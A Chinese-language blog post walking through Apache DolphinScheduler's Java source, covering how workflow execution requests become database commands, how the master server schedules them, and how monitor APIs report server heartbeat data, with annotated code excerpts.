一个项目有多个流程定义，一个流程定义可以生成多个流程实例，一个流程实例可以生成多个任务实例； t_ds_schedulers表存放流程定义的定时调度信息； t_ds_relation_process_instance表存放的数据用于处理流程定义中含有子流程的情况，parent_process_instance_id表示含有子流程的主流程实例id，process_instance_id表示子流程实例的id，parent_task_instance_id表示子流程节点的任务实例id，流程实例表和任务实例表分别对应t_ds_process_instance表和t_ds_task_instance表 03 DolphinScheduler 源码分析 讲解源码前，先贴一份官网的启动流程图： 3.1 ExecutorController DS org.apache.dolphinscheduler.api.controller.ExecutorController 以下是对各接口的描述： 接口 描述 &#x2F;start-process-instance 执行流程实例 &#x2F;batch-start-process-instance 批量执行流程实例 &#x2F;execute 操作流程实例，如：暂停, 停止, 重跑, 从暂停恢复,从停止恢复 &#x2F;batch-execute 批量操作流程实例 &#x2F;start-check 检查流程定义或检查所有的子流程定义是否在线 接下我们看看最核心的方法： 123456789101112131415161718192021222324252627/** * do action to process instance: pause, stop, repeat, recover from pause, recover from stop * * @param loginUser login user * @param projectCode project code * @param processInstanceId process instance id * @param executeType execute type * @return execute result code */ @ApiOperation(value = &quot;execute&quot;, notes = &quot;EXECUTE_ACTION_TO_PROCESS_INSTANCE_NOTES&quot;) @ApiImplicitParams(&#123; @ApiImplicitParam(name = &quot;processInstanceId&quot;, value = &quot;PROCESS_INSTANCE_ID&quot;, required = true, dataType = &quot;Int&quot;, example = &quot;100&quot;), @ApiImplicitParam(name = &quot;executeType&quot;, value = &quot;EXECUTE_TYPE&quot;, required = true, dataType = &quot;ExecuteType&quot;) &#125;) @PostMapping(value = &quot;/execute&quot;) @ResponseStatus(HttpStatus.OK) @ApiException(EXECUTE_PROCESS_INSTANCE_ERROR) @AccessLogAnnotation(ignoreRequestArgs = &quot;loginUser&quot;) public Result execute(@ApiIgnore @RequestAttribute(value = Constants.SESSION_USER) User loginUser, @ApiParam(name = &quot;projectCode&quot;, value = &quot;PROJECT_CODE&quot;, required = true) @PathVariable long projectCode, @RequestParam(&quot;processInstanceId&quot;) Integer processInstanceId, @RequestParam(&quot;executeType&quot;) ExecuteType executeType ) &#123; Map result = execService.execute(loginUser, projectCode, processInstanceId, executeType); return returnDataList(result); &#125; 可以看到execute接口，是直接使用ExecService去执行了，下面分析下。 3.2 ExecService DS 下面看看里面的execute方法，已经加好了注释： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103/** * 操作工作流实例 * * @param loginUser 登录用户 * @param projectCode 项目编码 * @param processInstanceId 流程实例ID * @param executeType 执行类型（repeat running、resume pause、resume failure、stop、pause） * @return 执行结果 */@Overridepublic Map&lt;String, Object&gt; execute(User loginUser, long projectCode, Integer processInstanceId, ExecuteType executeType) &#123;/*** 查询项目信息 **/ Project project = projectMapper.queryByCode(projectCode);//check user access for project/*** 判断当前用户是否有操作权限 **/ Map&lt;String, Object&gt; result = projectService.checkProjectAndAuth(loginUser, project, projectCode, ApiFuncIdentificationConstant.map.get(executeType)); if (result.get(Constants.STATUS) != Status.SUCCESS) &#123; return result; &#125;/*** 检查Master节点是否存在 **/ if (!checkMasterExists(result)) &#123; return result; &#125;/*** 查询工作流实例详情 **/ ProcessInstance processInstance = processService.findProcessInstanceDetailById(processInstanceId); if (processInstance == null) &#123; putMsg(result, Status.PROCESS_INSTANCE_NOT_EXIST, processInstanceId); return result; &#125;/*** 根据工作流实例绑定的流程定义ID查询流程定义 **/ ProcessDefinition processDefinition = processService.findProcessDefinition(processInstance.getProcessDefinitionCode(), processInstance.getProcessDefinitionVersion()); if (executeType != ExecuteType.STOP &amp;&amp; executeType != ExecuteType.PAUSE) &#123;/*** 校验工作流定义能否执行（工作流是否存在？是否上线状态？存在子工作流定义不是上线状态？） **/ result = checkProcessDefinitionValid(projectCode, processDefinition, processInstance.getProcessDefinitionCode(), processInstance.getProcessDefinitionVersion()); if (result.get(Constants.STATUS) != Status.SUCCESS) &#123; return result; &#125; &#125;/*** 根据当前工作流实例的状态判断能否执行对应executeType类型的操作 **/ result = checkExecuteType(processInstance, executeType); if (result.get(Constants.STATUS) != Status.SUCCESS) &#123; return result; &#125;/*** 判断是否已经选择了合适的租户 **/ if (!checkTenantSuitable(processDefinition)) &#123; logger.error(&quot;there is not any valid tenant for the process definition: id:&#123;&#125;,name:&#123;&#125;, &quot;, processDefinition.getId(), processDefinition.getName()); putMsg(result, Status.TENANT_NOT_SUITABLE); &#125;/*** 在executeType为重跑的状态下，获取用户指定的启动参数 **/ Map&lt;String, Object&gt; commandMap = JSONUtils.parseObject(processInstance.getCommandParam(), new TypeReference&lt;Map&lt;String, Object&gt;&gt;() &#123; &#125;); String startParams = null; if (MapUtils.isNotEmpty(commandMap) &amp;&amp; executeType == ExecuteType.REPEAT_RUNNING) &#123; Object startParamsJson = commandMap.get(Constants.CMD_PARAM_START_PARAMS); if (startParamsJson != null) &#123; startParams = startParamsJson.toString(); &#125; &#125;/*** 根据不同的ExecuteType去执行相应的操作 **/ switch (executeType) &#123; case REPEAT_RUNNING:// 重跑 result = insertCommand(loginUser, processInstanceId, processDefinition.getCode(), processDefinition.getVersion(), CommandType.REPEAT_RUNNING, startParams); break; case RECOVER_SUSPENDED_PROCESS:// 恢复挂载的工作流 result = insertCommand(loginUser, processInstanceId, processDefinition.getCode(), processDefinition.getVersion(), CommandType.RECOVER_SUSPENDED_PROCESS, startParams); break; case START_FAILURE_TASK_PROCESS:// 启动失败的工作流 result = insertCommand(loginUser, processInstanceId, processDefinition.getCode(), processDefinition.getVersion(), CommandType.START_FAILURE_TASK_PROCESS, startParams); break; case STOP:// 停止 if (processInstance.getState() == ExecutionStatus.READY_STOP) &#123; putMsg(result, Status.PROCESS_INSTANCE_ALREADY_CHANGED, processInstance.getName(), processInstance.getState()); &#125; else &#123; result = updateProcessInstancePrepare(processInstance, CommandType.STOP, ExecutionStatus.READY_STOP); &#125; break; case PAUSE:// 暂停 if (processInstance.getState() == ExecutionStatus.READY_PAUSE) &#123; putMsg(result, Status.PROCESS_INSTANCE_ALREADY_CHANGED, processInstance.getName(), processInstance.getState()); &#125; else &#123; result = updateProcessInstancePrepare(processInstance, CommandType.PAUSE, ExecutionStatus.READY_PAUSE); &#125; break; default: logger.error(&quot;unknown execute type : &#123;&#125;&quot;, executeType); putMsg(result, Status.REQUEST_PARAMS_NOT_VALID_ERROR, &quot;unknown execute type&quot;); break; &#125; return result;&#125; 可以看到，以上代码前半部分主要是做了校验的操作，后半部分是根据执行类型来做不同的操作，操作主要分为两部分：insertCommand以及updateProcessInstancePrepare。 execute执行接口分析 3.2.1 insertCommand DS 方法代码如下，其实主要就是把生成命令并插入t_ds_command（执行命令表），插入已经添加好注释： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546/** * 插入命令（re run, recovery (pause / failure) execution) * * @param loginUser 登录用户 * @param instanceId 工作流实例id * @param processDefinitionCode 工作流定义id * @param processVersion 工作流版本 * @param commandType 命令类型 * @return 操作结果 */private Map&lt;String, Object&gt; insertCommand(User loginUser, Integer instanceId, long processDefinitionCode, int processVersion, CommandType commandType, String startParams) &#123; Map&lt;String, Object&gt; result = new HashMap&lt;&gt;();/*** 封装启动参数 **/ Map&lt;String, Object&gt; cmdParam = new HashMap&lt;&gt;(); cmdParam.put(CMD_PARAM_RECOVER_PROCESS_ID_STRING, instanceId); if (!StringUtils.isEmpty(startParams)) &#123; cmdParam.put(CMD_PARAM_START_PARAMS, startParams); &#125; Command command = new Command(); command.setCommandType(commandType); command.setProcessDefinitionCode(processDefinitionCode); command.setCommandParam(JSONUtils.toJsonString(cmdParam)); command.setExecutorId(loginUser.getId()); command.setProcessDefinitionVersion(processVersion); command.setProcessInstanceId(instanceId);/*** 判断工作流实例是否正在执行 **/ if (!processService.verifyIsNeedCreateCommand(command)) &#123; putMsg(result, Status.PROCESS_INSTANCE_EXECUTING_COMMAND, String.valueOf(processDefinitionCode)); return result; &#125;/*** 保存命令 **/ int create = processService.createCommand(command); if (create &gt; 0) &#123; putMsg(result, Status.SUCCESS); &#125; else &#123; putMsg(result, Status.EXECUTE_PROCESS_INSTANCE_ERROR); &#125; return result;&#125; 3.2.2 updateProcessInstancePrepare DS 方法代码如下，已经添加注释 123456789101112131415161718192021222324252627282930/** * 准备更新工作流实例的命令类型和状态 * * @param processInstance 工作流实例 * @param commandType 命令类型 * @param executionStatus 执行状态 * @return 更新结果 */private Map&lt;String, Object&gt; updateProcessInstancePrepare(ProcessInstance processInstance, CommandType commandType, ExecutionStatus executionStatus) &#123; Map&lt;String, Object&gt; result = new HashMap&lt;&gt;(); processInstance.setCommandType(commandType); processInstance.addHistoryCmd(commandType); processInstance.setState(executionStatus); int update = processService.updateProcessInstance(processInstance);// 判断流程是否正常 if (update &gt; 0) &#123; StateEventChangeCommand stateEventChangeCommand = new StateEventChangeCommand( processInstance.getId(), 0, processInstance.getState(), processInstance.getId(), 0 ); Host host = new Host(processInstance.getHost()); stateEventCallbackService.sendResult(host, stateEventChangeCommand.convert2Command()); putMsg(result, Status.SUCCESS); &#125; else &#123; putMsg(result, Status.EXECUTE_PROCESS_INSTANCE_ERROR); &#125; return result;&#125; 根据流程图，我们可以看到了已经执行了如下红框的代码，也就是把我们的command已经缓存到了DB。 接下来需要看看Master的代码。 3.3 MasterServer DS 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111@SpringBootApplication@ComponentScan(&quot;org.apache.dolphinscheduler&quot;)@EnableTransactionManagement@EnableCachingpublic class MasterServer implements IStoppable &#123; private static final Logger logger = LoggerFactory.getLogger(MasterServer.class); @Autowired private SpringApplicationContext springApplicationContext; @Autowired private MasterRegistryClient masterRegistryClient; @Autowired private TaskPluginManager taskPluginManager; @Autowired private MasterSchedulerService masterSchedulerService; @Autowired private SchedulerApi schedulerApi; @Autowired private EventExecuteService eventExecuteService; @Autowired private FailoverExecuteThread failoverExecuteThread; @Autowired private MasterRPCServer masterRPCServer; public static void main(String[] args) &#123; Thread.currentThread().setName(Constants.THREAD_NAME_MASTER_SERVER); SpringApplication.run(MasterServer.class); &#125;/** * 启动 master server */ @PostConstruct public void run() throws SchedulerException &#123;// 初始化 RPC服务 this.masterRPCServer.start();//安装任务插件 this.taskPluginManager.installPlugin();/*** MasterServer 注册客户端，用于连接到注册表并传递注册表事件。 * 当主节点启动时，它将在注册中心注册,并调度一个&#123;@link HeartBeatTask&#125;来更新注册表中的元数据**/ this.masterRegistryClient.init(); this.masterRegistryClient.start(); this.masterRegistryClient.setRegistryStoppable(this);// 主调度程序线程，该线程将使用来自数据库的命令并触发执行的processInstance。 this.masterSchedulerService.init(); this.masterSchedulerService.start(); this.eventExecuteService.start(); this.failoverExecuteThread.start();//这是调度器的接口，包含操作调度任务的方法。 this.schedulerApi.start(); Runtime.getRuntime().addShutdownHook(new Thread(() -&gt; &#123; if (Stopper.isRunning()) &#123; close(&quot;MasterServer shutdownHook&quot;); &#125; &#125;)); &#125;/** * 优雅的关闭方法 * * @param cause 关闭的原因 */ public void close(String cause) &#123; try &#123;// set stop signal is true// execute only once if (!Stopper.stop()) &#123; logger.warn(&quot;MasterServer is already stopped, current cause: &#123;&#125;&quot;, cause); return; &#125; logger.info(&quot;Master server is stopping, current cause : &#123;&#125;&quot;, cause);// thread sleep 3 seconds for thread quietly stop ThreadUtils.sleep(Constants.SERVER_CLOSE_WAIT_TIME.toMillis());// close this.schedulerApi.close(); this.masterSchedulerService.close(); this.masterRPCServer.close(); this.masterRegistryClient.closeRegistry();// close spring Context and will invoke method with @PreDestroy annotation to destroy beans.// like ServerNodeManager,HostManager,TaskResponseService,CuratorZookeeperClient,etc springApplicationContext.close(); logger.info(&quot;MasterServer stopped, current cause: &#123;&#125;&quot;, cause); &#125; catch (Exception e) &#123; logger.error(&quot;MasterServer stop failed, current cause: &#123;&#125;&quot;, cause, e); &#125; &#125; @Override public void stop(String cause) &#123; close(cause); &#125;&#125; 在run方法里面，可以看到，主要依次执行了： **① MasterRPCServer.start()**：启动master的rpc服务； **② TaskPluginManager.installPlugin()**：安装任务插件； **③ MasterRegistryClient.start()**：向Zookeeper注册MasterServer； **④ MasterSchedulerService.start()**：主调度程序线程，该线程将使用来自数据库的命令并触发执行的processInstance。 **⑤ EventExecuteService.start()**：工作流实例执行情况 **⑥ FailoverExecuteThread()**：故障转移检测 **⑦ SchedulerApi.start()**：scheduler接口去操作任务实例 3.1.1 MasterRPCServer DS Master RPC Server主要用来发送或接收请求给其它系统。 初始化方法如下： 1234567891011121314151617181920212223@PostConstructprivate void init() &#123;// 初始化远程服务 NettyServerConfig serverConfig = new NettyServerConfig(); serverConfig.setListenPort(masterConfig.getListenPort()); this.nettyRemotingServer = new NettyRemotingServer(serverConfig); this.nettyRemotingServer.registerProcessor(CommandType.TASK_EXECUTE_RESPONSE, taskExecuteResponseProcessor); this.nettyRemotingServer.registerProcessor(CommandType.TASK_EXECUTE_RUNNING, taskExecuteRunningProcessor); this.nettyRemotingServer.registerProcessor(CommandType.TASK_KILL_RESPONSE, taskKillResponseProcessor); this.nettyRemotingServer.registerProcessor(CommandType.STATE_EVENT_REQUEST, stateEventProcessor); this.nettyRemotingServer.registerProcessor(CommandType.TASK_FORCE_STATE_EVENT_REQUEST, taskEventProcessor); this.nettyRemotingServer.registerProcessor(CommandType.TASK_WAKEUP_EVENT_REQUEST, taskEventProcessor); this.nettyRemotingServer.registerProcessor(CommandType.CACHE_EXPIRE, cacheProcessor); this.nettyRemotingServer.registerProcessor(CommandType.TASK_RECALL, taskRecallProcessor);// 日志服务 this.nettyRemotingServer.registerProcessor(CommandType.GET_LOG_BYTES_REQUEST, loggerRequestProcessor); this.nettyRemotingServer.registerProcessor(CommandType.ROLL_VIEW_LOG_REQUEST, loggerRequestProcessor); this.nettyRemotingServer.registerProcessor(CommandType.VIEW_WHOLE_LOG_REQUEST, loggerRequestProcessor); this.nettyRemotingServer.registerProcessor(CommandType.REMOVE_TAK_LOG_REQUEST, loggerRequestProcessor); this.nettyRemotingServer.start();&#125; 3.2.2 TaskPluginManager DS 到此部分源码解析完成整体流程运行 用户点击WEB界面的启动工作流按钮。 apiserver 封装 commnd 到 db（往 t_ds_command 表中插入一条数据）。 master 扫描到 commad，进行 dga 构建，初始化，将源头 task 提交到 priority 队列中。 taskConsumer 消费队列数据得到 task，选择一台 worker 分配任务。 worker 接收到分配任务的消息启动任务。 worker 返回结果给 master，master 更新任务信息到 db 。 03 DolphinScheduler源码剖析 3.1 apiserver任务执行入口 当用户在前端点击执行任务，则会向海豚调度的接口发送请求，最终由 ExecutorController 的 startProcessInstance 方法来处理请求。 ExecutorController.startProcessInstance() 方法。 最终会往 mysql 表 t_ds_command 插入一条数据，将要运行的工作流信息写入该表。 1234567891011121314151617181920212223242526272829303132333435363738394041424344@PostMapping(value = &quot;start-process-instance&quot;)@ResponseStatus(HttpStatus.OK)@ApiException(START_PROCESS_INSTANCE_ERROR)@AccessLogAnnotation(ignoreRequestArgs = &quot;loginUser&quot;)public Result startProcessInstance(@ApiIgnore @RequestAttribute(value = Constants.SESSION_USER) User loginUser, @ApiParam(name = &quot;projectCode&quot;, value = &quot;PROJECT_CODE&quot;, required = true) @PathVariable long projectCode, @RequestParam(value = &quot;processDefinitionCode&quot;) long processDefinitionCode, @RequestParam(value = &quot;scheduleTime&quot;) String scheduleTime, @RequestParam(value = &quot;failureStrategy&quot;) FailureStrategy failureStrategy, @RequestParam(value = &quot;startNodeList&quot;, required = false) String startNodeList, @RequestParam(value = &quot;taskDependType&quot;, required = false) TaskDependType taskDependType, @RequestParam(value = &quot;execType&quot;, required = false) CommandType execType, @RequestParam(value = &quot;warningType&quot;) WarningType warningType, @RequestParam(value = &quot;warningGroupId&quot;, required = false, defaultValue = &quot;0&quot;) Integer warningGroupId, @RequestParam(value = &quot;runMode&quot;, required = false) RunMode runMode, @RequestParam(value = &quot;processInstancePriority&quot;, required = false) Priority processInstancePriority, @RequestParam(value = &quot;workerGroup&quot;, required = false, defaultValue = &quot;default&quot;) String workerGroup, @RequestParam(value = &quot;environmentCode&quot;, required = false, defaultValue = &quot;-1&quot;) Long environmentCode, @RequestParam(value = &quot;timeout&quot;, required = false) Integer timeout, @RequestParam(value = &quot;startParams&quot;, required = false) String startParams, @RequestParam(value = &quot;expectedParallelismNumber&quot;, required = false) Integer expectedParallelismNumber, @RequestParam(value = &quot;dryRun&quot;, defaultValue = &quot;0&quot;, required = false) int dryRun, @RequestParam(value = &quot;complementDependentMode&quot;, required = false) ComplementDependentMode complementDependentMode) &#123; if (timeout == null) &#123; timeout = Constants.MAX_TASK_TIMEOUT; &#125; Map&lt;String, String&gt; startParamMap = null; if (startParams != null) &#123; startParamMap = JSONUtils.toMap(startParams); &#125; if (complementDependentMode == null) &#123; complementDependentMode = ComplementDependentMode.OFF_MODE; &#125; //生成commnd信息入库 Map&lt;String, Object&gt; result = execService.execProcessInstance(loginUser, projectCode, processDefinitionCode, scheduleTime, execType, failureStrategy, startNodeList, taskDependType, warningType, warningGroupId, runMode, processInstancePriority, workerGroup, environmentCode, timeout, startParamMap, expectedParallelismNumber, dryRun, complementDependentMode); return returnDataList(result);&#125; 3.2 master 调度任务 3.2.1 master启动 DS MasterServer.run() 方法 启动 master 的工作线程 12345678910111213141516171819202122232425public void run() throws SchedulerException &#123;// init rpc serverthis.masterRPCServer.start();//启动netty rpc服务，与worker通信使用// install task pluginthis.taskPluginManager.loadPlugin();//加载taskplugin// self tolerantthis.masterRegistryClient.init();//加载高可用的一些注册信息this.masterRegistryClient.start();this.masterRegistryClient.setRegistryStoppable(this);//command扫描线程this.masterSchedulerBootstrap.init();this.masterSchedulerBootstrap.start();//事件处理线程this.eventExecuteService.start();this.failoverExecuteThread.start();//定时调度this.schedulerApi.start();Runtime.getRuntime().addShutdownHook(new Thread(() -&gt; &#123; if (Stopper.isRunning()) &#123; close(&quot;MasterServer shutdownHook&quot;); &#125;&#125;));&#125; 3.2.2 command扫描 DS MasterSchedulerBootstrap.run()方法 该线程在3.2.1启动，启动之后，进入循环，一直扫描 command 表，查询出 command，然后封装成 processInstants 入库，创建 WorkflowExecuteRunnable (此对象后续很多地方用到) 写入到 workflowEventQueue 中。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758public void run() &#123; while (Stopper.isRunning()) &#123; try &#123; // todo: if the workflow event queue is much, we need to handle the back pressure boolean isOverload = OSUtils.isOverload(masterConfig.getMaxCpuLoadAvg(), masterConfig.getReservedMemory()); if (isOverload) &#123; MasterServerMetrics.incMasterOverload(); Thread.sleep(Constants.SLEEP_TIME_MILLIS); continue; &#125; List&lt;Command&gt; commands = findCommands(); if (CollectionUtils.isEmpty(commands)) &#123; // indicate that no command ,sleep for 1s Thread.sleep(Constants.SLEEP_TIME_MILLIS); continue; &#125; //将command转换成processInstance,并入库 List&lt;ProcessInstance&gt; processInstances = command2ProcessInstance(commands); if (CollectionUtils.isEmpty(processInstances)) &#123; // indicate that the command transform to processInstance error, sleep for 1s Thread.sleep(Constants.SLEEP_TIME_MILLIS); continue; &#125; MasterServerMetrics.incMasterConsumeCommand(commands.size()); processInstances.forEach(processInstance -&gt; &#123; try &#123; LoggerUtils.setWorkflowInstanceIdMDC(processInstance.getId()); if (processInstanceExecCacheManager.contains(processInstance.getId())) &#123; logger.error(&quot;The workflow instance is already been cached, this case shouldn&#x27;t be happened&quot;); &#125; WorkflowExecuteRunnable workflowRunnable = new WorkflowExecuteRunnable(processInstance, processService, nettyExecutorManager, processAlertManager, masterConfig, stateWheelExecuteThread, curingGlobalParamsService); processInstanceExecCacheManager.cache(processInstance.getId(), workflowRunnable);//processInstanceExecCacheManager设置进cache 被 workflowEventLoop获取 workflowEventQueue.addEvent(new WorkflowEvent(WorkflowEventType.START_WORKFLOW, processInstance.getId())); &#125; finally &#123; LoggerUtils.removeWorkflowInstanceIdMDC(); &#125; &#125;); &#125; catch (InterruptedException interruptedException) &#123; logger.warn(&quot;Master schedule bootstrap interrupted, close the loop&quot;, interruptedException); Thread.currentThread().interrupt(); break; &#125; catch (Exception e) &#123; logger.error(&quot;Master schedule workflow error&quot;, e); // sleep for 1s here to avoid the database down cause the exception boom ThreadUtils.sleep(Constants.SLEEP_TIME_MILLIS); &#125; &#125;&#125; }3.2.3 workerFlowEvent消费 DS 在 command 扫描线程中启动了 workflowEventLooper 线程用于消费 workerFlowEvent 。 MasterSchedulerBootstrap.start() 方法 1234567@Overridepublic synchronized void start() &#123; logger.info(&quot;Master schedule bootstrap starting..&quot;); super.start(); workflowEventLooper.start();//工作流调度线程启动 logger.info(&quot;Master schedule bootstrap started...&quot;);&#125; 从workflowEventQueue 拉取 workflowevent 事件，调用 workflowEventHandler 处理该事件。 WorkflowEventLooper.run()方法 12345678910111213141516171819202122232425262728293031323334public void run() &#123; WorkflowEvent workflowEvent = null; while (Stopper.isRunning()) &#123; try &#123; workflowEvent = workflowEventQueue.poolEvent();//拉取workflowevent LoggerUtils.setWorkflowInstanceIdMDC(workflowEvent.getWorkflowInstanceId()); logger.info(&quot;Workflow event looper receive a workflow event: &#123;&#125;, will handle this&quot;, workflowEvent); WorkflowEventHandler workflowEventHandler = workflowEventHandlerMap.get(workflowEvent.getWorkflowEventType());//获取workflowevent，处理workflowevent事件 workflowEventHandler.handleWorkflowEvent(workflowEvent); &#125; catch (InterruptedException e) &#123; logger.warn(&quot;WorkflowEventLooper thread is interrupted, will close this loop&quot;, e); Thread.currentThread().interrupt(); break; &#125; catch (WorkflowEventHandleException workflowEventHandleException) &#123; logger.error(&quot;Handle workflow event failed, will add this event to event queue again, event: &#123;&#125;&quot;, workflowEvent, workflowEventHandleException); workflowEventQueue.addEvent(workflowEvent); ThreadUtils.sleep(Constants.SLEEP_TIME_MILLIS); &#125; catch (WorkflowEventHandleError workflowEventHandleError) &#123; logger.error(&quot;Handle workflow event error, will drop this event, event: &#123;&#125;&quot;, workflowEvent, workflowEventHandleError); &#125; catch (Exception unknownException) &#123; logger.error( &quot;Handle workflow event failed, get a unknown exception, will add this event to event queue again, event: &#123;&#125;&quot;, workflowEvent, unknownException); workflowEventQueue.addEvent(workflowEvent); ThreadUtils.sleep(Constants.SLEEP_TIME_MILLIS); &#125; finally &#123; LoggerUtils.removeWorkflowInstanceIdMDC(); &#125; &#125;&#125; 3.2.4 workerflow事件处理逻辑 DS 因为是START_WORKFLOW类型的所以获取到 WorkflowStartEventHandler.handleWorkflowEvent() 来处理该事件。 该方法中，获取 WorkflowExecuteRunnable ，运行异步任务调用 call 方法。 1234567891011121314151617181920212223242526272829303132@Overridepublic void handleWorkflowEvent(WorkflowEvent workflowEvent) throws WorkflowEventHandleError &#123; logger.info(&quot;Handle workflow start event, begin to start a workflow, event: &#123;&#125;&quot;, workflowEvent);//获取WorkflowExecuteRunnable WorkflowExecuteRunnable workflowExecuteRunnable = processInstanceExecCacheManager.getByProcessInstanceId(workflowEvent.getWorkflowInstanceId()); if (workflowExecuteRunnable == null) &#123; throw new WorkflowEventHandleError( &quot;The workflow start event is invalid, cannot find the workflow instance from cache&quot;); &#125; ProcessInstance processInstance = workflowExecuteRunnable.getProcessInstance(); ProcessInstanceMetrics.incProcessInstanceSubmit(); //异步调用call方法执行workflowExecute运行逻辑。 CompletableFuture&lt;WorkflowSubmitStatue&gt; workflowSubmitFuture = CompletableFuture.supplyAsync(workflowExecuteRunnable::call, workflowExecuteThreadPool); workflowSubmitFuture.thenAccept(workflowSubmitStatue -&gt; &#123; if (WorkflowSubmitStatue.SUCCESS == workflowSubmitStatue) &#123; // submit failed will resend the event to workflow event queue logger.info(&quot;Success submit the workflow instance&quot;);//监听返回状态是否成功 if (processInstance.getTimeout() &gt; 0) &#123;//是否超时 stateWheelExecuteThread.addProcess4TimeoutCheck(processInstance); &#125; &#125; else &#123;//出现异常，重试，重新进入队列，调用call方法 logger.error(&quot;Failed to submit the workflow instance, will resend the workflow start event: &#123;&#125;&quot;, workflowEvent); workflowEventQueue.addEvent(new WorkflowEvent(WorkflowEventType.START_WORKFLOW, processInstance.getId())); &#125; &#125;);&#125; 3.2.5 workerflowRunnable运行逻辑 DS WorkflowExecuteRunnable.call() 初始化workerflow的有向无环图。 初始化任务调度配置 提交源头任务到任务优先级队列中。","categories":[{"name":"技术","slug":"技术","permalink":"http://blog.ioimp.top/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"dolphinscheduler","slug":"dolphinscheduler","permalink":"http://blog.ioimp.top/tags/dolphinscheduler/"},{"name":"大数据分析平台","slug":"大数据分析平台","permalink":"http://blog.ioimp.top/tags/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90%E5%B9%B3%E5%8F%B0/"},{"name":"GitHub","slug":"GitHub","permalink":"http://blog.ioimp.top/tags/GitHub/"}]},{"title":"dolphinscheduler监控功能刨析","slug":"dolphinscheduler监控功能刨析","date":"2023-07-18T01:43:54.000Z","updated":"2023-08-04T01:46:07.073Z","comments":true,"path":"2023/07/18/dolphinscheduler监控功能刨析/","link":"","permalink":"http://blog.ioimp.top/2023/07/18/dolphinscheduler%E7%9B%91%E6%8E%A7%E5%8A%9F%E8%83%BD%E5%88%A8%E6%9E%90/","excerpt":"","text":"dolphinscheduler源码分析记录Dolphinscheduler-api-1MonitorController.java部分 任务一：新增功能获取master&#x2F;work服务器CPU核心数目以及一共磁盘大小， 任务二：分析如何向监控中心API中写入master&#x2F;work服务器CPU核心数目以及一共磁盘大小， 核心代码部分: 123456789101112131415/** * master list * * @param loginUser login user * @return master list */ @ApiOperation(value = &quot;listMaster&quot;, notes = &quot;MASTER_LIST_NOTES&quot;) @GetMapping(value = &quot;/masters&quot;) @ResponseStatus(HttpStatus.OK) @ApiException(LIST_MASTERS_ERROR) @AccessLogAnnotation(ignoreRequestArgs = &quot;loginUser&quot;) public Result listMaster(@ApiIgnore @RequestAttribute(value = Constants.SESSION_USER) User loginUser) &#123; Map&lt;String, Object&gt; result = monitorService.queryMaster(loginUser); return returnDataList(result); &#125; MonitorService.java接口功能核心部分 1Map&lt;String, Object&gt; queryMaster(User loginUser); MonitorServiceImpl.java接口实现类核心部分 123456789101112131415/** * query master list * * @param loginUser login user * @return master information list */ @Override public Map&lt;String, Object&gt; queryMaster(User loginUser) &#123; Map&lt;String, Object&gt; result = new HashMap&lt;&gt;(); List&lt;Server&gt; masterServers = getServerListFromRegistry(true); result.put(Constants.DATA_LIST, masterServers); putMsg(result, Status.SUCCESS); return result; &#125; result.put(Constants.*DATA_LIST*, masterServers); 语句中Constants.*DATA_LIST* 是前端json里的data数组部分，装入masterServers getServerListFromRegistry(true);方法 123456@Override public List&lt;Server&gt; getServerListFromRegistry(boolean isMaster) &#123; return isMaster ? registryClient.getServerList(NodeType.MASTER) : registryClient.getServerList(NodeType.WORKER); &#125; registryClient.getServerList(NodeType.*MASTER*) 获取master节点的服务信息列表 123456789101112131415161718192021222324252627282930313233343536373839404142public List&lt;Server&gt; getServerList(NodeType nodeType) &#123; Map&lt;String, String&gt; serverMaps = getServerMaps(nodeType, false); String parentPath = rootNodePath(nodeType); List&lt;Server&gt; serverList = new ArrayList&lt;&gt;(); for (Map.Entry&lt;String, String&gt; entry : serverMaps.entrySet()) &#123; String serverPath = entry.getKey(); String heartBeatJson = entry.getValue(); if (StringUtils.isEmpty(heartBeatJson)) &#123; logger.error(&quot;The heartBeatJson is empty, serverPath: &#123;&#125;&quot;, serverPath); continue; &#125; Server server = new Server(); switch (nodeType) &#123; case MASTER: MasterHeartBeat masterHeartBeat = JSONUtils.parseObject(heartBeatJson, MasterHeartBeat.class); server.setCreateTime(new Date(masterHeartBeat.getStartupTime())); server.setLastHeartbeatTime(new Date(masterHeartBeat.getReportTime())); server.setId(masterHeartBeat.getProcessId()); server.setCpuCoreCount(masterHeartBeat.getCpuCoreCount());//获取cpu核心数 break; case WORKER: WorkerHeartBeat workerHeartBeat = JSONUtils.parseObject(heartBeatJson, WorkerHeartBeat.class); server.setCreateTime(new Date(workerHeartBeat.getStartupTime())); server.setLastHeartbeatTime(new Date(workerHeartBeat.getReportTime())); server.setId(workerHeartBeat.getProcessId()); break; &#125; server.setResInfo(heartBeatJson); // todo: add host, port in heartBeat Info, so that we don&#x27;t need to parse this again server.setZkDirectory(parentPath + &quot;/&quot; + serverPath); // set host and port String[] hostAndPort = serverPath.split(COLON); String[] hosts = hostAndPort[0].split(DIVISION_STRING); // fetch the last one server.setHost(hosts[hosts.length - 1]); server.setPort(Integer.parseInt(hostAndPort[1])); serverList.add(server); &#125; return serverList; &#125; [MasterHeartBeat.java](http://MasterHeartBeat.java) master心跳 12345678910111213141516171819202122232425262728293031323334353637383940414243/* * Licensed to the Apache Software Foundation (ASF) under one or more * contributor license agreements. See the NOTICE file distributed with * this work for additional information regarding copyright ownership. * The ASF licenses this file to You under the Apache License, Version 2.0 * (the &quot;License&quot;); you may not use this file except in compliance with * the License. You may obtain a copy of the License at * * http://www.apache.org/licenses/LICENSE-2.0 * * Unless required by applicable law or agreed to in writing, software * distributed under the License is distributed on an &quot;AS IS&quot; BASIS, * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. * See the License for the specific language governing permissions and * limitations under the License. */package org.apache.dolphinscheduler.common.model;import lombok.AllArgsConstructor;import lombok.Builder;import lombok.Data;import lombok.NoArgsConstructor;@Data@Builder@NoArgsConstructor@AllArgsConstructorpublic class MasterHeartBeat implements HeartBeat &#123; private long startupTime; private long reportTime; private double cpuUsage; private double memoryUsage; private double loadAverage; private double availablePhysicalMemorySize; private double maxCpuloadAvg; private double reservedMemory; private double diskAvailable; private int processId; // 新增核数 private int 